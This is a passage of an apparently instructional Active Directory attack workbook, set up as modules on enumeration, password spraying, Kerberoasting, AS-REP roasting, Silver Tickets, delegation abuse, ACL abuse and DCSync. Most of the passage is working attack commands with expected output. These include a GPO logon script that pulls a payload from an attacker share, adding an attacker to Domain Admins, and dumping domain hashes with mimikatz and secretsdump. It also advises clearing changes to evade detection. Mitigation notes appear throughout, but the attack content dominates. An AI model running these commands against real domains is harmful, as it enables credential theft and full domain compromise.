  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(cn=Enterprise Admins))" member
  ```

- Account Operators:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Builtin,DC=corp,DC=local" "(&(objectCategory=group)(cn=Account Operators))" member
  ```

#### 4. Recursive Group Membership

```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(member:1.2.840.113556.1.4.1941:=CN=helpdesk,CN=Users,DC=corp,DC=local))" cn,distinguishedName,member
```

**Expected Output**:  
```
dn: CN=Admins,OU=Groups,DC=corp,DC=local
cn: Admins
member: CN=helpdesk,CN=Users,DC=corp,DC=local

dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
cn: Domain Admins
member: CN=Admins,OU=Groups,DC=corp,DC=local
member: CN=jsmith,CN=Users,DC=corp,DC=local
```

#### 5. Check ACLs on Users OU

```powershell
$aclUsers = Get-Acl "AD:CN=Users,DC=corp,DC=local"
$aclUsers.Access | Where-Object { $_.ActiveDirectoryRights -match "GenericAll" -or $_.ActiveDirectoryRights -match "WriteDacl" } | Select-Object IdentityReference,ActiveDirectoryRights,ObjectType,InheritanceType
```

**Expected Output**:  
```
IdentityReference          ActiveDirectoryRights   ObjectType                               InheritanceType
-----------------          ---------------------   ----------                               ---------------
CORP\AuditGroup            WriteDacl               bf967aba-0de6-11d0-a285-00aa003049e2    Descendents,This Object
CORP\Domain Admins         GenericAll              bf967aba-0de6-11d0-a285-00aa003049e2    Descendents,This Object
BUILTIN\Administrators     GenericAll              bf967aba-0de6-11d0-a285-00aa003049e2    Descendents,This Object
```

- “AuditGroup” has WriteDacl on Users OU → shadow admin.

### Common Pitfalls  
- Misinterpreting `groupType` bits  
- Overlooking ACL inheritance  
- Ignoring built-in groups in `CN=Builtin`

### Next Steps  
- **Module 5**: Enumerating Computers, SPN Delegation & Trust Relationships  

---

## <a name="module-7"></a> Module 7: Credentialed Enumeration (Linux & Windows)

_Use valid credentials to uncover detailed Active Directory information._

### Key Concepts

-   **Authenticated Bind**  
    Connecting to LDAP or PowerShell AD cmdlets using a valid username and password (e.g., `User1 / Pass123`) to access information beyond what anonymous binds allow.
    
-   **User Object**  
    Represents a person in AD. Key attributes include `sAMAccountName` (username), `mail`, `title`, and `manager`.
    
-   **Group Object**  
    Collections of users. Groups like `Domain Admins` grant special privileges; listing members shows who holds those rights.
    
-   **Computer Object**  
    Represents a machine joined to the domain. Knowing OS and name helps identify targets for further attacks.
    

----------

### Tools & Commands

-   **ldapsearch** (Kali Linux) – Query AD over LDAP with credentials
    
    ```bash
    ldapsearch -x -H ldap://dc1.lab.local \
      -D "LAB\User1" -w Pass123 \
      -b "DC=lab,DC=local" \
      "(objectCategory=person)" sAMAccountName,mail,title,manager
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    sAMAccountName: jdoe
    mail: jdoe@lab.local
    title: Finance Analyst
    manager: CN=Jane Smith,OU=Users,DC=lab,DC=local
    
    ```
    
-   **Get-ADGroupMember** (PowerShell) – List members of a group
    
    ```powershell
    Import-Module ActiveDirectory
    Get-ADGroupMember -Identity "Domain Admins" | Select Name,SamAccountName
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    Name            SamAccountName
    ----            --------------
    Lab Admin User  labadmin
    
    ```
    
-   **Get-ADComputer** (PowerShell) – Enumerate computer accounts
    
    ```powershell
    Get-ADComputer -Filter * -Properties OperatingSystem | Select Name,OperatingSystem
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    Name        OperatingSystem
    ----        ---------------
    DC1         Windows Server 2019
    WORKSTN1    Windows 10 Pro
    
    ```
    

----------

### Step-by-Step Guide

1.  **Perform an authenticated LDAP query for users**
    
    ```bash
    ldapsearch -x -H ldap://dc1.lab.local \
      -D "LAB\User1" -w Pass123 \
      -b "DC=lab,DC=local" \
      "(objectCategory=person)" sAMAccountName,mail,title,manager
    
    ```
    
    _What to look for:_ Usernames with emails and job titles, showing roles and reporting chains.
    
2.  **List Domain Admins group members**
    
    ```powershell
    Get-ADGroupMember -Identity "Domain Admins" | Select Name,SamAccountName
    
    ```
    
    _What to look for:_ Names of high-privilege accounts you may target later.
    
3.  **Enumerate all computer accounts**
    
    ```powershell
    Get-ADComputer -Filter * -Properties OperatingSystem | Select Name,OperatingSystem
    
    ```
    
    _What to look for:_ Servers vs workstations to prioritize attacks.
    

----------

### Expected Result

-   A list of user accounts with key attributes for profiling.
    
-   Identification of privileged group members.
    
-   Inventory of computers and their OS versions.
    

----------

### Mitigation & Hardening

-   **Limit LDAP read permissions**: Allow only necessary users to perform directory queries.
    
-   **Audit and monitor** credentialed queries, especially group membership and computer enumeration.
    

----------

### Next Steps

-   **Attack Type:** Reconnaissance → Privilege Escalation
    
-   **Attack Path:**
    
    1.  Use user attributes to identify high-value targets.
        
    2.  Move to **Enumerating Security Controls** to check ACLs and GPOs next.
        

----------


## <a name="module-8"></a> Module 8: Enumerating Security Controls (GPOs, ACLs, AD CS, AEP)

_Detect and analyze the policies, permissions, and security settings protecting Active Directory._

### Key Concepts

-   **Group Policy Object (GPO)**  
    A GPO is a rulebook you attach to groups of users or computers (OUs). It automatically applies settings like password policies, user rights, and scripts. For example, if **"Allow log on locally"** is granted to **Everyone**, any user can log on to domain machines—a dangerous misconfiguration.
    
-   **Access Control List (ACL)**  
    AD objects (users, groups, OUs) have ACLs listing who can do what:
    
    -   **GenericAll**: Full control over the object and its children (read, modify, delete).
        
    -   **GenericRead**: View all properties and list child objects.
        
    -   **GenericWrite**: Modify all properties and create child objects.
        
    -   **ReadProperty** / **WriteProperty**: Read or modify specific attributes (e.g., `userAccountControl`).
        
    -   **Delete**: Remove the object.
        
    -   **WriteDacl**: Change the ACL itself—adding or removing ACEs.
        
    -   **WriteOwner**: Change the owner of the object.
        
    -   **InheritanceType: All**: The permission applies to child objects as well.
        
-   **AD CS (Certificate Services) & Templates**  
    Active Directory Certificate Services (AD CS) provides Public Key Infrastructure (PKI) within AD. Certificates are digital IDs issued to users, computers, or services to enable strong authentication and secure communications.
    
    -   **Why certificates are used**: They allow password-less authentication, encrypt LDAP traffic (LDAPS), and support smart-card logon via **PKINIT**.
        
    -   **PKINIT (Public Key Cryptography for Initial Authentication in Kerberos)**: An extension to Kerberos that uses certificates instead of (or in addition to) passwords for the initial ticket-granting request. Think of it as showing a secure badge rather than reciting a secret phrase.
        
    -   **Certificate Templates** define who can request, autoenroll, or manage certificates. Misconfigurations include:
        
        -   **Authenticated Users with Enroll**: Any user can request certificates, leading to unauthorized access.
            
        -   **Autoenroll for broad groups**: Persistent certificates issued without admin oversight.
            
        -   **Excessive Manage/Full Control rights**: Attackers can modify templates to weaken security (e.g., allow issuance of CA certificates).
            
-   **Advanced Encryption Policy (AEP)**  
    Domain-wide settings enforcing strong cryptography:
    
    -   **AES-only Kerberos**: Forces ticket encryption with AES.
        
    -   **LDAPS Sign/Channel Binding**: Ensures LDAP sessions cannot be tampered with.
        

----------

### Tools & Commands

-   **Get-GPOReport** – Export all GPOs to HTML
    
    ```powershell
    Import-Module GroupPolicy
    Get-GPOReport -All -ReportType HTML -Path AllGPOs.html
    
    ```
    
    _Expected Output Snippet (search for “Allow log on locally”):_
    
    ```html
    <Setting Name="Allow log on locally" Value="Everyone"/>
    
    ```
    
-   **Get-ObjectAcl** – View ACLs and understand ACEs
    
    ```powershell
    Get-ObjectAcl -DistinguishedName "OU=Admins,DC=lab,DC=local" -ResolveGUIDs | FL
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    IdentityReference      : LAB\\AdminsGroup
    ActiveDirectoryRights  : GenericAll
    InheritanceType        : All
    
    ```
    
-   **certutil** – Inspect certificate-template permissions
    
    ```powershell
    certutil -view -restrict "Certificate Template=DomainController"
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    Template Name: DomainController
    Permissions  : Authenticated Users (Read, Enroll), Domain Admins (Full Control)
    
    ```
    
-   **nltest** – Verify LDAPS signing and channel binding enforcement
    
    ```bat
    nltest /sc_query:LAB
    
    ```
    
    _Expected Output Snippet:_
    
    ```text
    Flags: 0x10000 (SEAL)
    
    ```
    

----------

### Step-by-Step Guide

1.  **Export GPO settings**
    
    ```powershell
    Get-GPOReport -All -ReportType HTML -Path AllGPOs.html
    
    ```
    
    _Check the HTML for misconfigurations like broad “Allow log on locally” assignments._
    
2.  **Analyze ACLs on critical objects**
    
    ```powershell
    Get-ObjectAcl -DistinguishedName "OU=Finance,DC=lab,DC=local" -ResolveGUIDs | FL
    
    ```
    
    _Look for `ActiveDirectoryRights : GenericAll` or `WriteDacl`._
    
3.  **Review certificate template permissions**
    
    ```powershell
    certutil -view -restrict "Certificate Template=User"
    
    ```
    
    _Verify only intended security groups have Enroll/Autoenroll._
    
4.  **Confirm LDAP signing/channel binding**
    
    ```bat
    nltest /sc_query:LAB
    
    ```
    
    _Ensure `SEAL` is present in flags._
    

----------

### Expected Result

-   Identification of overly permissive GPO entries.
    
-   Detection of dangerous ACL rights on AD objects.
    
-   Discovery of certificate templates with insecure enrollment permissions.
    
-   Confirmation that LDAP signing/channel binding is enforced.
    

----------

### Exploitation When Misconfigured

-   **Allow log on locally = Everyone**: Deploy malicious GPO logon script as SYSTEM
    
    ```powershell
    Set-GPRegistryValue -Name "VulnGPO" -Key "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Logon" -ValueName "0" -Type String -Value "powershell -exec bypass -File \\\"\\\\attacker\\\\payload.ps1\\\""
    
    ```
    
-   **GenericAll / WriteDacl**: Add attacker to Domain Admins
    
    ```powershell
    Add-ADGroupMember -Identity "Domain Admins" -Members "AttackerUser"
    
    ```
    
-   **Authenticated Users Enroll**: Request and use user certificate for PKINIT
    
    ```powershell
    certreq -submit -attrib "CertificateTemplate:User" user.inf user.cer
    kinit -k -t user.cer user@LAB.LOCAL
    
    ```
    
-   **Missing LDAPS signing**: Relay NTLMv2 to LDAP for DCSync
    
    ```bash
    ntlmrelayx.py -t ldap://dc1.lab.local --escalate-method drsuapi
    
    ```
    

----------

### Mitigation & Hardening

-   Remove “Allow log on locally” from Everyone.
    
-   Strip GenericAll/WriteDacl from non-admins.
    
-   Restrict certificate-template Enroll/Autoenroll.
    
-   Enforce LDAP signing/channel binding via GPO.
    

----------

### Next Steps

-   Use misconfigurations to gain SYSTEM or Domain Admin.
    
-   Clean up persistent GPO and ACL changes to reduce detection.
    

----------
## <a name="module-9"></a> Module 9: Password Spraying (Building Target Lists; Linux & Windows)

_Refine user lists and perform password spraying from both Linux and Windows platforms._

### Key Concepts

-   **Password Spraying**  
    Trying a single (or small set of) common password(s) against many accounts to avoid lockouts. Like testing the same key on many locks rather than many keys on one lock.
    
-   **Target List**  
    A curated list of usernames focused by role, group membership, or organizational unit—enabling more efficient attacks than blind spraying.
    
-   **Account Lockout**  
    A defense that temporarily blocks accounts after a threshold of failed attempts. Proper spraying stays below this threshold.
    
-   **Credential Validation**  
    Verifying that sprayed passwords worked, using protocols like LDAP bind or SMB authentication.
    

----------

### Tools & Commands

-   **ldapsearch** (Kali Linux) – Build target lists via LDAP
    
    ```
    ldapsearch -x -H ldap://dc1.lab.local \
      -b "OU=Sales,DC=lab,DC=local" \
      "(objectCategory=person)" sAMAccountName > targets.txt
    ```
    
    _Expected Output Snippet (targets.txt):_
    
    ```
    jdoe
    asmith
    mbrown
    ```
    
-   **CrackMapExec** (Linux/Windows) – Spray passwords via SMB/LDAP
    
    ```
    # echo "Spring2025!" | cme ldap lab.local -u targets.txt --continue-on-success
    ```

### Windows example (PowerShell)

cme ldap lab.local -u targets.txt -p "Spring2025!" --continue-on-success

```
_Expected Output Snippet:_
```text
[*] LAB\jdoe:Spring2025! (LDAP)  
[*] LAB\asmith:Spring2025! (LDAP)
```

----------

### Step-by-Step Guide

1.  **Generate a focused target list**
    
    ```
    ldapsearch -x -H ldap://dc1.lab.local \
      -b "OU=IT,DC=lab,DC=local" \
      "(objectClass=person)" sAMAccountName > targets.txt
    ```
    
    _Result:_  `targets.txt` with IT department usernames.
    
2.  **Perform spraying on Linux**
    
    ```
    cme ldap lab.local -u targets.txt -p "Autumn2025!" --continue-on-success
    ```
    
    _Look for:_  `LAB\asmith:Autumn2025! (LDAP)` indicating success.
    
3.  **Perform spraying on Windows**
    
    ```
    cme ldap lab.local -u targets.txt -p "Autumn2025!" --continue-on-success
    ```
    
    _Look for:_ Successful bind entries similar to above.
    
4.  **Validate credentials**
    
    ```
    smbclient -L \dc1.lab.local -U jdoe%Autumn2025!
    ```
    
    _If you see share listings, the password is valid._
    

----------

### Expected Result

-   A list of accounts that accepted the sprayed password in CrackMapExec output.
    
-   Successful SMB share listings via valid credentials.
    

----------

### Mitigation & Hardening

-   **Implement tighter lockout policies**: Lower threshold (e.g., 3 attempts) and longer lockout durations.
    
-   **Enable Multi-Factor Authentication (MFA)** for all critical accounts.
    
-   **Monitor for rapid failed logins** and alert on anomalies.
    

----------

### Next Steps

-   **Attack Type:** Targeted Password Spraying → Credential Validation
    
-   **Attack Path:**
    
    1.  Build and refine target lists via LDAP.
        
    2.  Spray common passwords with CME.
        
    3.  Validate valid credentials for deeper enumeration or persistence.
- - - - - 
## <a name="module-10"></a> Module 10: Enumerating Computers, SPN Delegation & Trust Relationships

### Introduction  
Find computer accounts, identify SPN delegation (Kerberoast, unconstrained, constrained, RBCD), and map trust relationships.

### Definitions  
1. **Computer Account**: AD object for a host; `sAMAccountName` ends with `$`.  
2. **SPN Delegation**:  
   - **Kerberoasting**: Obtain TGS for SPN encrypted with account password.  
   - **Unconstrained Delegation**: `TRUSTED_FOR_DELEGATION` bit in `userAccountControl`.  
   - **Constrained Delegation**: `msDS-AllowedToDelegateTo` attribute.  
   - **RBCD**: `msDS-AllowedToActOnBehalfOfOtherIdentity`.  
3. **Trust Relationship**: Link between domains; one-way or two-way.

### Why It Matters  
- SPNs yield offline cracking.  
- Unconstrained delegation allows impersonation.  
- Trusts can open the entire forest.

### Tools & Commands  

#### LDAP Queries  
- All computers:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=computer)" sAMAccountName,operatingSystem,distinguishedName,servicePrincipalName,userAccountControl
  ```  
- SPN hosts:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName
  ```  
- Unconstrained delegation:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName,distinguishedName,userAccountControl
  ```  
- Constrained delegation:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" sAMAccountName,msDS-AllowedToDelegateTo
  ```  
- Trust relationships:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Configuration,DC=corp,DC=local" "(objectClass=crossRef)" nETBIOSName,dnsRoot,trustPartner,trustDirection
  ```

#### PowerShell  
- All computers:  
  ```powershell
  Get-ADComputer -Filter * -Properties operatingSystem,servicePrincipalName,userAccountControl
  ```  
- SPN hosts:  
  ```powershell
  Get-ADComputer -Filter {servicePrincipalName -like "*"} -Properties servicePrincipalName
  ```  
- Unconstrained delegation:  
  ```powershell
  Get-ADComputer -Filter {userAccountControl -band 524288} -Properties userAccountControl
  ```  
- Constrained delegation:  
  ```powershell
  Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo
  ```  
- Trust relationships:  
  ```powershell
  Get-ADTrust -Filter * | Select Name,TrustType,Direction,Target
  ```

### Step-by-Step Guide  

#### 1. Enumerate All Computers  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=computer)" sAMAccountName,operatingSystem,distinguishedName,servicePrincipalName,userAccountControl
```
**Expected Output (partial)**:  
```
dn: CN=DC01,CN=Computers,DC=corp,DC=local
sAMAccountName: DC01$
operatingSystem: Windows Server 2022 Datacenter
servicePrincipalName: GC/DC01.corp.local
userAccountControl: 532480

dn: CN=WS001,OU=Workstations,DC=corp,DC=local
sAMAccountName: WS001$
operatingSystem: Windows 10 Pro
userAccountControl: 4096

dn: CN=SRV-FS01,OU=FileServers,DC=corp,DC=local
sAMAccountName: SRV-FS01$
operatingSystem: Windows Server 2019 Standard
userAccountControl: 528704
```

#### 2. Identify Kerberoastable Hosts (SPNs)  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName
```
**Expected Output**:  
```
dn: CN=SRV-SQL01,OU=Servers,DC=corp,DC=local
sAMAccountName: SRV-SQL01$
servicePrincipalName: MSSQLSvc/sqlsrv.corp.local:1433

dn: CN=SRV-SQL02,OU=Servers,DC=corp,DC=local
sAMAccountName: SRV-SQL02$
servicePrincipalName: MSSQLSvc/sql02.corp.local:1433, MSSQLSvc/sql02.corp.local

dn: CN=SRV-EX01,OU=MailServers,DC=corp,DC=local
sAMAccountName: SRV-EX01$
servicePrincipalName: SMTP/ex01.corp.local
```

#### 3. Identify Unconstrained Delegation Hosts  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName,distinguishedName,userAccountControl
```
**Expected Output**:  
```
dn: CN=DC01,CN=Computers,DC=corp,DC=local
sAMAccountName: DC01$
userAccountControl: 532480

dn: CN=SRV-FS01,OU=FileServers,DC=corp,DC=local
sAMAccountName: SRV-FS01$
userAccountControl: 528704
```

#### 4. Identify Constrained Delegation Hosts  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" sAMAccountName,msDS-AllowedToDelegateTo
```
**Expected Output**:  
```
dn: CN=SRV-WEB01,OU=WebServers,DC=corp,DC=local
sAMAccountName: SRV-WEB01$
msDS-AllowedToDelegateTo: HTTP/sqlsrv.corp.local

dn: CN=SRV-APP01,OU=AppServers,DC=corp,DC=local
sAMAccountName: SRV-APP01$
msDS-AllowedToDelegateTo: MSSQLSvc/sql02.corp.local:1433
```

#### 5. Enumerate Trust Relationships  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "CN=Configuration,DC=corp,DC=local" "(objectClass=crossRef)" nETBIOSName,dnsRoot,trustPartner,trustDirection
```
**Expected Output**:  
```
dn: CN=SALES,DC=Configuration,DC=corp,DC=local
nETBIOSName: SALES
dnsRoot: sales.corp.local
trustPartner: CORP.corp.local
trustDirection: 3

dn: CN=DEV,DC=Configuration,DC=corp,DC=local
nETBIOSName: DEV
dnsRoot: dev.corp.local
trustPartner: CORP.corp.local
trustDirection: 2
```

### Scenarios & Branching Logic  

#### Scenario 1: Domain User  
- Find SPN hosts → Kerberoast → crack → pivot.  
- If no SPNs, find unconstrained delegation hosts → gain local access → impersonate DA.  

#### Scenario 2: Local Admin on Workstation  
- Dump cached creds → find DA creds → PtH/PtT → pivot.  
- Check LAPS → retrieve local admin password → pivot.  
- Check scheduled tasks → extract service creds → pivot.  

#### Scenario 3: Domain Admin  
- Already DA: focus on persistence (Module 11) and advanced credential theft (Module 9).  

### Common Pitfalls  
- LDAP returning stale computer accounts  
- SPNs on offline hosts  
- Misreading delegation flags  
- Trust direction confusion  

### Next Steps  
- **Module 6**: ACL Misconfiguration Deep Dive & Shadow Admin Discovery  

---
## <a name="module-11"></a> Module 11: Kerberos Attacks

_A deep dive into Kerberos-based attacks and ticket abuses._

### Key Concepts

-   **Kerberos**  
    The core authentication protocol in AD. It issues time-limited tickets instead of sending passwords over the network.
    
-   **Key Distribution Center (KDC)**  
    The AD service on Domain Controllers that issues tickets. It has two parts: the Authentication Service (AS) and the Ticket Granting Service (TGS).
    
-   **Ticket Granting Ticket (TGT)**  
    A ticket you obtain once by authenticating (password or PKINIT). It allows you to request service tickets (TGS) without re-entering your credentials.
    
-   **Ticket Granting Service (TGS) Ticket**  
    A service-specific ticket encrypted with the service account’s key. Used to authenticate to that service.
    
-   **Service Principal Name (SPN)**  
    The unique name for a service (e.g., `HTTP/srv1.lab.local`). Kerberoasting targets SPN accounts to request TGS tickets.
    
-   **Constrained Delegation**  
    A setting that lets a service use your TGT to request TGS tickets for specific downstream services on your behalf. If misconfigured, attackers can perform a **double hop** attack to impersonate users across services.
    
-   **Double Hop**  
    The technique of using delegated credentials from one service to access another service, e.g., impersonate a user from a web server to a database server.
    
-   **AS-REP Roasting**  
    Targets accounts with Kerberos preauthentication disabled. Attackers request an AS-REP (initial TGT) without preauth, capture the encrypted response, and crack it offline to recover the password.
    
-   **Silver Ticket**  
    A forged TGS for a specific service created by encrypting the ticket with the service account’s NTLM hash. Bypasses the KDC entirely, used when the service account hash is known.
    
-   **Golden Ticket**  
    A forged TGT encrypted with the KRBTGT account hash. Grants unrestricted domain-wide access for its validity period.
    
-   **PKINIT**  
    An extension to Kerberos initial authentication that uses X.509 certificates instead of passwords to obtain a TGT.
    
-   **S4U (Service for User)**  
    Extensions allowing services to obtain tickets on behalf of users:
    
    -   **S4U2Self:** A service requests a TGS for a user without the user’s credentials.
        
    -   **S4U2Proxy:** A service uses its own TGS and an S4U2Self ticket to request a second TGS for another service.
        
-   **Rubeus**  
    A C# tool for Kerberos abuse: ticket requests (AS-REP, S4U), ticket renewal, Silver/Golden ticket forging, and harvesting.
    

----------

### 1. Kerberoasting (Linux & Windows)

_Request TGS tickets for service accounts tagged with SPNs and crack them offline to reveal their passwords._

#### Deep Dive & Analogy

Imagine a busy hotel (AD forest) where each guest (user) has a master keycard (TGT) issued at the front desk (KDC). To enter a specific room (service), you request a room-key (TGS) from the front desk. That key is encoded with the room’s lock combination (service account password). In Kerberoasting, you:

![enter image description here](https://github.com/ShubhamDubeyy/Active-Directory-Workbook/blob/main/kerberoast.png?raw=true)

Attackers skip step 4 and grab the encoded room-key (TGS) in step 3. They then try all possible room combinations (password guesses) offline until the key unlocks, revealing the service account’s password.

#### Key Concepts

-   **Service Account**: A special account that services (like SQL, HTTP) use – akin to a hotel room’s lock code.
    
-   **Service Principal Name (SPN)**: The official room number registered in the hotel directory (e.g., `HTTP/SRV1.lab.local`).
    
-   **Ticket Granting Service (TGS)**: The encoded room-key for that SPN.
    
-   **Offline Cracking**: Trying password guesses against the encrypted ticket without talking to the hotel staff (DC), avoiding alarms.
    

#### Tools & Commands

-   **GetUserSPNs.py** (Impacket)
    
    ```bash
    # Step 1: Request TGS for all SPN accounts
    GetUserSPNs.py -request -dc-ip dc1.lab.local lab.local/DOMAINUSER:Pass > spn.hashes
    
    ```
    
    _Expected Output_: `Hash for svc_http@LAB.LOCAL saved in spn.hashes`
    
-   **hashcat**
    
    ```bash
    # Step 2: Crack TGS hashes offline (mode 13100)
    hashcat -m 13100 spn.hashes wordlist.txt
    
    ```
    
    _Expected Output_: `Recovered: svc_http:P@ssw0rd123`
    
-   **kinit**
    
    ```bash
    # Step 3: Validate cracked password by obtaining a TGT
    kinit svc_http@LAB.LOCAL
    
    ```
    
    _Expected Output_: No error; new ticket in cache.
    

#### Step-by-Step Guide

1.  **Discover SPN Accounts**
    
    ```bash
    ldapsearch -x -H ldap://dc1.lab.local -b "DC=lab,DC=local" "(servicePrincipalName=*)" sAMAccountName,servicePrincipalName
    
    ```
    
    _Look for lines:_
    
    ```text
    sAMAccountName: svc_http
    servicePrincipalName: HTTP/SRV1.lab.local
    
    ```
    
2.  **Request TGS Tickets**
    
    ```bash
    GetUserSPNs.py -request -dc-ip dc1.lab.local lab.local/DOMAINUSER:Pass > spn.hashes
    
    ```
    
    _Check_: `spn.hashes` contains encrypted tickets.
    
3.  **Offline Cracking**
    
    ```bash
    hashcat -m 13100 spn.hashes wordlist.txt
    
    ```
    
    _Result_: Plaintext passwords, e.g., `svc_http:P@ssw0rd123`.
    
4.  **Validate Credentials**
    
    ```bash
    kinit svc_http@LAB.LOCAL
    
    ```
    
    _Success Indicator_: No error; `klist` shows new TGT.
    

----------

### 2. Kerberos Double Hop & Constrained Delegation

_Exploit services configured to delegate on behalf of users._

#### Tools & Commands

-   **Get-DomainObject** (PowerView)
    
    ```powershell
    # List services with constrained delegation
    Import-Module .\PowerView.ps1
    Get-DomainObject -SearchBase "OU=Services,DC=lab,DC=local" -LDAPFilter "(msDS-AllowedToDelegateTo=*)" -Properties msDS-AllowedToDelegateTo
    
    ```
    
    _Expected Output:_ Lists service accounts and allowed SPNs.
    
-   **Rubeus**
    
    ```powershell
    # Perform S4U2Self to get TGS for target user
    Rubeus.exe s4u /user:svc_http /impersonateuser:Administrator /service:HTTP/srv1.lab.local
    
    ```
    
    _Expected Output:_ A new TGS ticket for Administrator is injected into cache.
    

#### Step-by-Step

1.  Identify services with constrained delegation.
    
2.  Use Rubeus S4U2Self to request a TGS as Administrator.
    
3.  Access service as Administrator without AD credentials.
    

----------

### 3. AS-REP Roasting & Silver Ticket Attacks

_Extract AS-REP hashes and forge service tickets._

#### Tools & Commands

-   **GetNPUsers.py** (Impacket)
    
    ```bash
    # Extract AS-REP hashes
    GetNPUsers.py -dc-ip dc1.lab.local lab.local/ -no-pass > asrep.hashes
    
    ```
    
    _Expected Output:_ Lines like `svc_backup:...`
    
-   **hashcat**
    
    ```bash
    hashcat -m 18200 asrep.hashes wordlist.txt
    
    ```
    
    _Expected Output:_ `Recovered: svc_backup:MyBackupPass`
    
-   **Rubeus** (Silver Ticket)
    
    ```powershell
    # Forge Silver Ticket for HTTP service
    Rubeus.exe silver /domain:lab.local /sid:S-1-5-21... /rc4:ServiceAccountNTLMHash /service:HTTP/srv1.lab.local /target:SRV1
    
    ```
    
    _Expected Output:_ `Ticket \\srv1\HTTP injected into kerb cache successfully`
    

#### Step-by-Step

1.  AS-REP Roasting: find preauth-disabled accounts, extract and crack.
    
2.  Silver Ticket: use known service hash to forge TGS.
    
3.  Authenticate to the service using the forged ticket.
    

----------

### Expected Result

-   Plaintext passwords for service and no-preauth accounts.
    
-   Active S4U TGS for privileged users.
    
-   Forged Silver Tickets in cache enabling service access.
    

----------

### Mitigation & Hardening

-   Enforce Kerberos preauthentication for all accounts.
    
-   Disable unconstrained or restricted delegation where not required.
    
-   Monitor for anomalous S4U requests and ticket usage.
    
-   Rotate service and krbtgt passwords regularly.
    

----------

### References

1.  [Kerberoasting Explained](https://adsecurity.org/?p=1438)
    
2.  [Rubeus Documentation](https://github.com/GhostPack/Rubeus)
    
3.  [Impacket Toolkit](https://github.com/SecureAuthCorp/impacket)
    
- - - 
## <a name="module-12"></a> Module 12: ACL & DCSync Abuse

_Understand how to abuse AD’s permission model and replication features._

### Key Concepts

-   **Access Control List (ACL)**  
    Each AD object has an ACL: a list of who can do what. Permissions (ACEs) include:
    
    -   **GenericAll**: Full control—read, write, delete, and modify permissions.
        
    -   **GenericWrite**: Modify object properties and add child objects.
        
    -   **WriteDacl**: Change the ACL itself—add or remove ACEs.
        
    -   **Replicating Directory Changes** (`DS-Replication-Get-Changes`): Permission to pull password hashes via DCSync.
        
-   **DCSync**  
    Abuse of the `Replicating Directory Changes` ACL to request password hashes directly from a DC, as if you were a DC. No plaintext password needed.
    
-   **DCShadow**  
    A stealthy replication attack where you register a rogue domain controller and push changes (e.g., new admin account) back to the real DCs without detection.
    

----------

### ACL Enumeration Techniques

_Discover who holds powerful permissions on AD objects._

#### Tools & Commands

-   **Get-ObjectAcl** (PowerShell)
    
    ```powershell
    # Enumerate ACLs on an OU or object
    Get-ObjectAcl -DistinguishedName "OU=Protected,DC=lab,DC=local" -ResolveGUIDs | Format-Table IdentityReference,ActiveDirectoryRights
    
    ```
    
    _Expected Output:_
    
    ```text
    IdentityReference    ActiveDirectoryRights
    -----------------    ---------------------
    LAB\\AdminGroup     GenericAll
    LAB\\BackupOps     DS-Replication-Get-Changes
    
    ```
    
-   **BloodHound** (CLI)
    
    ```bash
    # Using SharpHound to collect ACL data
    SharpHound.exe --CollectionMethod ACL
    
    ```
    
    _Expected Output Files:_ `acls.json` showing ACEs graph data.
    

----------

### ACL Abuse Tactics

_Leverage powerful ACEs to escalate privileges immediately._

#### Actions

1.  **GenericAll on a group**
    
    ```powershell
    # Add yourself to high-privilege group
    Add-ADGroupMember -Identity "Domain Admins" -Members "AttackerUser"
    
    ```
    
    _Effect:_ Instant Domain Admin rights.
    
2.  **GenericWrite on a user**
    
    ```powershell
    # Reset password of an admin account
    Set-ADAccountPassword -Identity "AdminUser" -NewPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force)
    
    ```
    
    _Effect:_ Control over admin credentials.
    
3.  **WriteDacl on an OU**
    
    ```powershell
    # Grant Replicating Directory Changes to self on domain root
    $acl = Get-Acl AD:\DC=lab,DC=local
    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule("LAB\\AttackerUser","DS-Replication-Get-Changes","Allow")
    $acl.AddAccessRule($ace)
    Set-Acl AD:\DC=lab,DC=local $acl
    
    ```
    
    _Effect:_ Prepare for DCSync by granting needed replication rights.
    

----------

### DCSync & DCShadow

_Extract or inject data via AD replication protocols._

### Why It Matters  
- DCSync: quick domain hash dump.  
- DCShadow: stealth backdoor insertion.

### Tools & Commands  
#### Mimikatz DCSync  
```powershell
mimikatz.exe
privilege::debug
lsadump::dcsync /domain:corp.local /user:krbtgt
```
**Expected Output**: List of user hashes.

#### Impacket secretsdump.py  
```bash
python3 secretsdump.py corp.local/administrator@dc01.corp.local
```
**Expected Output**: Domain user hashes.
